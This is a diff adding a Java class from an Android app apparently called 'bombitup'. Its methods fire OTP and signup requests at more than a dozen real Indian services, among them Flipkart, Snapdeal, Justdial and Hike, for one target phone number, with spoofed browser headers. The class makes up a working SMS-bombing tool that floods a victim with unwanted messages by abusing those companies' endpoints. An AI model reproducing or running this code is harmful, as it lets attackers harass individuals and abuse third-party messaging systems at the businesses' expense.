@@ -1,0 +1,703 @@
+package bombitup.romreviwer.com.bombitup;
+
+import android.util.Log;
+
+import org.json.JSONObject;
+
+import java.io.IOException;
+import java.util.HashMap;
+import java.util.Map;
+
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.Headers;
+import okhttp3.MediaType;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
+
+public class RestCalls
+{
+	public void sulekha(String phno)
+	{
+		Request request = new Request.Builder()
+				.url("https://myaccount.sulekha.com/network/userauthv1.aspx?mode=sendvcode&mobilenumber=" + phno + "&rnd=0")
+				.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
+				.tag("sulekha")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request)
+		                  .enqueue(new Callback()
+		                  {
+			                  @Override
+			                  public void onFailure(final Call call, final IOException e)
+			                  {
+
+			                  }
+
+			                  @Override
+			                  public void onResponse(final Call call, final Response response) throws IOException
+			                  {
+
+			                  }
+		                  });
+//		textView.setText("SMS SENT VIA SULEKHA API");
+	}
+
+	public void goibibo(String phno)
+	{
+		Request request = new Request.Builder()
+				.url("https://www.goibibo.com/common/downloadsms/")
+				.post(RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=" + phno))
+				.addHeader("host", "www.goibibo.com")
+				.addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
+				.addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+				.addHeader("accept-language", "en-US,en;q=0.5")
+				.addHeader("accept-encoding", "gzip, deflate, br")
+				.addHeader("referer", "https://www.goibibo.com/mobile/?sms=success")
+				.addHeader("content-type", "application/x-www-form-urlencoded")
+				.addHeader("content-length", "14")
+				.addHeader("connection", "keep-alive")
+				.addHeader("upgrade-insecure-requests", "1")
+				.tag("goibibo")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request)
+		                  .enqueue(new Callback()
+		                  {
+			                  @Override
+			                  public void onFailure(final Call call, final IOException e)
+			                  {
+
+			                  }
+
+			                  @Override
+			                  public void onResponse(final Call call, final Response response) throws IOException
+			                  {
+
+			                  }
+		                  });
+//		textView2.setText("SMS SENT VIA Goibibo API");
+	}
+
+	public void justdial(String phno)
+	{
+		Request request = new Request.Builder()
+				.url("https://www.justdial.com/functions/ajxandroid.php?phn=" + phno + "&em=e.g.+abc%40xyz.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile")
+				.addHeader("User-Agent",
+				           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
+				.tag("justdial")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request).enqueue(new Callback()
+		{
+			@Override
+			public void onFailure(final Call call, final IOException e)
+			{
+
+			}
+
+			@Override
+			public void onResponse(final Call call, final Response response) throws IOException
+			{
+
+			}
+		});
+
+//		textView.setText("SMS SENT VIA JUSTDIAL API");
+	}
+
+	public void naptol(String phno)
+	{
+		Request request = new Request.Builder()
+				.url("https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=" + phno)
+				.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
+				.tag("naptol")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request).enqueue(new Callback()
+		{
+			@Override
+			public void onFailure(final Call call, final IOException e)
+			{
+
+			}
+
+			@Override
+			public void onResponse(final Call call, final Response response) throws IOException
+			{
+
+			}
+		});
+//		textView.setText("SMS SENT VIA NAPTOL API");
+	}
+
+	public void spencers(String phno)
+	{
+		Request request = new Request.Builder()
+				.url("http://www.spencers.in/genOtp/genOTP.php?action=genOTP&phone=" + phno)
+				.addHeader("User-Agent",
+				           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
+				.tag("spencers")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request).enqueue(new Callback()
+		{
+			@Override
+			public void onFailure(final Call call, final IOException e)
+			{
+
+			}
+
+			@Override
+			public void onResponse(final Call call, final Response response) throws IOException
+			{
+
+			}
+		});
+//		textView.setText("SMS SENT VIA Spencer API");
+	}
+
+	public void hike(String phno)
+	{
+		MediaType parse = MediaType.parse("application/json; charset=utf-8");
+		Map hashMap = new HashMap();
+		hashMap.put("method", "pin");
+		hashMap.put("msisdn", "+91".concat(phno));
+		JSONObject jSONObject = new JSONObject(hashMap);
+
+		Request request = new Request.Builder()
+				.url("http://api.im.hike.in/v3/account/validate?digits=4")
+				.post(RequestBody.create(parse, jSONObject.toString()))
+				.addHeader("content-type", "application/json; charset=utf-8")
+				.tag("hike")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request)
+		                  .enqueue(new Callback()
+		                  {
+			                  @Override
+			                  public void onFailure(final Call call, final IOException e)
+			                  {
+
+			                  }
+
+			                  @Override
+			                  public void onResponse(final Call call, final Response response) throws IOException
+			                  {
+
+			                  }
+		                  });
+
+//		textView2.setText("SMS SENT VIA Hike API");
+	}
+
+	public void flipkart(final String phno)
+	{
+		MediaType parse = MediaType.parse("application/json; charset=utf-8");
+
+
+		Request request = new Request.Builder()
+				.url("https://www.flipkart.com/api/6/user/signup/status")
+				.post(RequestBody.create(parse, "{\"loginId\":[\"+91" + phno + "\"],\"supportAllStates\":true}"))
+				.addHeader("host", "www.flipkart.com")
+				.addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
+				.addHeader("accept", "*/*")
+				.addHeader("accept-language", "en-US,en;q=0.5")
+				.addHeader("accept-encoding", "gzip, deflate, br")
+				.addHeader("referer", "https://www.flipkart.com/")
+				.addHeader("x-user-agent",
+				           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop")
+				.addHeader("content-type", "application/json").addHeader("origin", "https://www.flipkart.com")
+				.addHeader("content-length", "53")
+				.addHeader("connection", "keep-alive")
+				.tag("flipkart")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request)
+		                  .enqueue(new Callback()
+		                  {
+			                  @Override
+			                  public void onFailure(final Call call, final IOException e)
+			                  {
+
+			                  }
+
+			                  @Override
+			                  public void onResponse(final Call call, final Response response) throws IOException
+			                  {
+				                  flipkart(response.header("Set-Cookie"), phno);
+			                  }
+		                  });
+//		textView.setText("SMS SENT VIA Flipkart API");
+	}
+
+	public void snapdeal(String phno)
+	{
+
+		Request request = new Request.Builder()
+				.url("https://www.snapdeal.com/sendOTP")
+				.post(RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"),
+				                         "emailId=&mobileNumber=" + phno + "&purpose=LOGIN_WITH_MOBILE_OTP"))
+				.addHeader("host", "www.snapdeal.com")
+				.addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
+				.addHeader("accept", "*/*")
+				.addHeader("accept-language", "en-US,en;q=0.5")
+				.addHeader("accept-encoding", "gzip, deflate, br")
+				.addHeader("referer", "https://www.snapdeal.com/iframeLogin")
+				.addHeader("content-type", "application/x-www-form-urlencoded")
+				.addHeader("x-requested-with", "XMLHttpRequest")
+				.addHeader("content-length", "62")
+				.addHeader("connection", "keep-alive")
+				.tag("snapdeal")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request)
+		                  .enqueue(new Callback()
+		                  {
+			                  @Override
+			                  public void onFailure(final Call call, final IOException e)
+			                  {
+
+			                  }
+
+			                  @Override
+			                  public void onResponse(final Call call, final Response response) throws IOException
+			                  {
+
+			                  }
+		                  });
+//		textView2.setText("SMS SENT VIA SnapDeal API");
+	}
+
+	public void mobikwik(String phno)
+	{
+		MediaType parse = MediaType.parse("application/json; charset=utf-8");
+		Map hashMap = new HashMap();
+		hashMap.put("cell", phno);
+		JSONObject jSONObject = new JSONObject(hashMap);
+
+		Request request = new Request.Builder()
+				.url("https://appapi.mobikwik.com/p/account/otp/cell")
+				.post(RequestBody.create(parse, jSONObject.toString()))
+				.addHeader("content-type", "application/json")
+				.addHeader("User-Agent", "")
+				.addHeader("X-App-Ver", "1")
+				.addHeader("X-MClient", "1")
+				.tag("mobikwik")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request)
+		                  .enqueue(new Callback()
+		                  {
+			                  @Override
+			                  public void onFailure(final Call call, final IOException e)
+			                  {
+
+			                  }
+
+			                  @Override
+			                  public void onResponse(final Call call, final Response response) throws IOException
+			                  {
+
+			                  }
+		                  });
+//		textView2.setText("SMS SENT VIA MOBIKWIK API");
+	}
+
+	public void netmeds(String phno)
+	{
+		Request request = new Request.Builder()
+				.url("https://www.netmeds.com/sociallogin/popup/checkmobileno/")
+				.post(RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"),
+				                         "register_mobileno=" + phno))
+				.addHeader("host", "www.netmeds.com")
+				.addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
+				.addHeader("accept", "*/*")
+				.addHeader("accept-language", "en-US,en;q=0.5")
+				.addHeader("accept-encoding", "gzip, deflate, br")
+				.addHeader("referer", "https://www.netmeds.com/customer/account/create/")
+				.addHeader("content-type", "application/x-www-form-urlencoded")
+				.addHeader("x-requested-with", "XMLHttpRequest")
+				.addHeader("content-length", "28")
+				.tag("netmeds")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request)
+		                  .enqueue(new Callback()
+		                  {
+			                  @Override
+			                  public void onFailure(final Call call, final IOException e)
+			                  {
+
+			                  }
+
+			                  @Override
+			                  public void onResponse(final Call call, final Response response) throws IOException
+			                  {
+
+			                  }
+		                  });
+//		textView2.setText("SMS SENT VIA meds API");
+	}
+
+	public void treebo(String phno)
+	{
+		Request request = new Request.Builder()
+				.url("https://www.treebo.com/api/v2/auth/login/otp/")
+				.post(RequestBody
+						      .create(MediaType.parse("application/json"), "{\"phone_number\":\"" + phno + "\"}"))
+				.addHeader("host", "www.treebo.com")
+				.addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
+				.addHeader("accept", "*/*")
+				.addHeader("accept-language", "en-US,en;q=0.5")
+				.addHeader("accept-encoding", "gzip, deflate, br")
+				.addHeader("referer", "https://www.treebo.com/login/")
+				.addHeader("content-type", "application/json")
+				.addHeader("authorization", "Bearer null")
+				.addHeader("origin", "https://www.treebo.com")
+				.addHeader("content-length", "29")
+				.addHeader("connection", "keep-alive")
+				.tag("treebo")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request)
+		                  .enqueue(new Callback()
+		                  {
+			                  @Override
+			                  public void onFailure(final Call call, final IOException e)
+			                  {
+
+			                  }
+
+			                  @Override
+			                  public void onResponse(final Call call, final Response response) throws IOException
+			                  {
+
+			                  }
+		                  });
+//		textView2.setText("SMS SENT VIA Treebo API");
+	}
+
+	public void homeshop(String phno)
+	{
+		Request request = new Request.Builder()
+				.url("https://mbe.homeshop18.com/services/secure/user/generate/otp")
+				.post(RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"),
+				                         "submit=submit&identity=" + phno + "&otpType=SIGNUP_OTP"))
+				.addHeader("x-hs18-app-version", "3.1.0")
+				.addHeader("x-hs18-app-id", "0")
+				.addHeader("x-hs18-device-version", "25")
+				.addHeader("content-type", "application/x-www-form-urlencoded")
+				.addHeader("accept-charset", "UTF-8")
+				.addHeader("x-hs18-app-platform", "androidApp")
+				.tag("homeshop")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request).enqueue(new Callback()
+		{
+			@Override
+			public void onFailure(final Call call, final IOException e)
+			{
+
+			}
+
+			@Override
+			public void onResponse(final Call call, final Response response) throws IOException
+			{
+
+			}
+		});
+//		textView2.setText("SMS SENT VIA HomeShop API");
+	}
+
+	public void iffcobazar(String phno)
+	{
+		Request request = new Request.Builder()
+				.url("https://www.iffcobazar.in/login_otp.html")
+				.post(RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"),
+				                         "submitted=yes&phone_no=" + phno))
+				.addHeader("host", "www.iffcobazar.in")
+				.addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
+				.addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+				.addHeader("accept-language", "en-US,en;q=0.5")
+				.addHeader("accept-encoding", "gzip, deflate, br")
+				.addHeader("referer", "https://www.iffcobazar.in/login_otp.html")
+				.addHeader("content-type", "application/x-www-form-urlencoded")
+				.addHeader("content-length", "33")
+				.addHeader("connection", "keep-alive")
+				.addHeader("upgrade-insecure-requests", "1")
+				.tag("iffcobazar")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request)
+		                  .enqueue(new Callback()
+		                  {
+			                  @Override
+			                  public void onFailure(final Call call, final IOException e)
+			                  {
+
+			                  }
+
+			                  @Override
+			                  public void onResponse(final Call call, final Response response) throws IOException
+			                  {
+
+			                  }
+		                  });
+//		textView2.setText("SMS SENT VIA Iffcobazar API");
+	}
+
+	public void paisabazaar(String phno)
+	{
+		Request request = new Request.Builder()
+				.url("https://myaccount.paisabazaar.com/my-account/")
+				.post(RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"),
+				                         "mobile_number=" + phno + "&step=send_password&request_page=landing"))
+				.addHeader("host", "myaccount.paisabazaar.com")
+				.addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
+				.addHeader("accept", "application/json, text/javascript, */*; q=0.01")
+				.addHeader("accept-language", "en-US,en;q=0.5")
+				.addHeader("accept-encoding", "gzip, deflate, br")
+				.addHeader("referer", "https://myaccount.paisabazaar.com/my-account/")
+				.addHeader("content-type", "application/x-www-form-urlencoded")
+				.addHeader("x-requested-with", "XMLHttpRequest")
+				.addHeader("content-length", "64")
+				.addHeader("connection", "keep-alive")
+				.tag("paisabazaar")
+				.build();
+
+		printLog(request);
+		new OkHttpClient()
+				.newCall(request)
+				.enqueue(new Callback()
+				{
+					@Override
+					public void onFailure(final Call call, final IOException e)
+					{
+
+					}
+
+					@Override
+					public void onResponse(final Call call, final Response response) throws IOException
+					{
+
+					}
+				});
+//		textView2.setText("SMS SENT VIA pbaz API");
+	}
+
+	public void tata(String phno)
+	{
+		Request request = new Request.Builder()
+				.url("https://www.tatadocomo.com/INonRender/Personal_MydocomoApp/GenerateOTP?mobile=".concat(phno))
+				.tag("tata")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request)
+		                  .enqueue(new Callback()
+		                  {
+			                  @Override
+			                  public void onFailure(final Call call, final IOException e)
+			                  {
+
+			                  }
+
+			                  @Override
+			                  public void onResponse(final Call call, final Response response) throws IOException
+			                  {
+
+			                  }
+		                  });
+//		textView.setText("SMS SENT VIA Tata API");
+	}
+
+	public void healthkart(final String phno)
+	{
+		Request request = new Request.Builder()
+				.url("https://www.healthkart.com/api/user/validate/" + phno + "/signup?trackingSource=HM-LPOPUP")
+				.addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
+				.tag("healthkart")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request)
+		                  .enqueue(new Callback()
+		                  {
+			                  @Override
+			                  public void onFailure(final Call call, final IOException e)
+			                  {
+
+			                  }
+
+			                  @Override
+			                  public void onResponse(final Call call, final Response response) throws IOException
+			                  {
+				                  healthkart(response, phno);
+			                  }
+		                  });
+	}
+
+	public void narendramodi(String phno)
+	{
+		Request request = new Request.Builder()
+				.url("http://www.narendramodi.in/site/senddnldlink?contact_no=91%C2%A0".concat(phno))
+				.tag("narendramodi")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request)
+		                  .enqueue(new Callback()
+		                  {
+			                  @Override
+			                  public void onFailure(final Call call, final IOException e)
+			                  {
+
+			                  }
+
+			                  @Override
+			                  public void onResponse(final Call call, final Response response) throws IOException
+			                  {
+
+			                  }
+		                  });
+//		textView.setText("SMS SENT VIA narendramodi API");
+	}
+
+	private void flipkart(String cookie, String phno)
+	{
+		Request request = new Request.Builder()
+				.url("https://www.flipkart.com/api/5/user/otp/generate")
+				.post(RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "loginId=%2B91" + phno))
+				.addHeader("host", "www.flipkart.com")
+				.addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
+				.addHeader("accept", "*/*")
+				.addHeader("accept-language", "en-US,en;q=0.5")
+				.addHeader("accept-encoding", "gzip, deflate, br")
+				.addHeader("referer", "https://www.flipkart.com/")
+				.addHeader("x-user-agent",
+				           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop")
+				.addHeader("content-type", "application/x-www-form-urlencoded").addHeader("origin", "https://www.flipkart.com")
+				.addHeader("content-length", "21")
+				.addHeader("cookie", cookie)
+				.addHeader("connection", "keep-alive")
+				.tag("flipkart_2")
+				.build();
+
+		printLog(request);
+
+		new OkHttpClient().newCall(request)
+		                  .enqueue(new Callback()
+		                  {
+			                  @Override
+			                  public void onFailure(final Call call, final IOException e)
+			                  {
+
+			                  }
+
+			                  @Override
+			                  public void onResponse(final Call call, final Response response) throws IOException
+			                  {
+
+			                  }
+		                  });
+	}
+
+	private void healthkart(Response response, String phno)
+	{
+		boolean requestOtp = false;
+		try
+		{
+			requestOtp = Boolean.valueOf(new JSONObject(response.body().string()).getBoolean("exception")).booleanValue();
+		}
+		catch (Exception e)
+		{
+		}
+
+		if (requestOtp)
+		{
+			Request request = new Request.Builder()
+					.url("https://www.healthkart.com/api/user/login/send/otp/" + phno + "?trackingSource=HM-LPOPUP")
+					.addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
+					.tag("healthkart_2")
+					.build();
+
+			printLog(request);
+
+			new OkHttpClient().newCall(request)
+			                  .enqueue(new Callback()
+			                  {
+				                  @Override
+				                  public void onFailure(final Call call, final IOException e)
+				                  {
+
+				                  }
+
+				                  @Override
+				                  public void onResponse(final Call call, final Response response) throws IOException
+				                  {
+
+				                  }
+			                  });
+			//		textView.setText("SMS SENT VIA htk API");
+		}
+	}
+
+	private void printLog(Request request)
+	{
+		Map<String, String> hashMap = new HashMap<>();
+		Headers headers = request.headers();
+		if (headers != null)
+		{
+			for (int i = 0; i < headers.size(); i++)
+			{
+				hashMap.put(headers.name(i), headers.value(i));
+			}
+		}
+
+		String body = "";
+		if (request.body() != null)
+		{
+			body = request.body().toString();
+		}
+
+		Log.d("ApiCalls", "RestRequest{" +
+				"method='" + request.method() + '\'' +
+				", url='" + request.url().toString() + '\'' +
+				", body='" + body + '\'' +
+				", headers=" + hashMap + '\'' +
+				", tag='" + request.tag().toString() +
+				'}');
+	}
+}
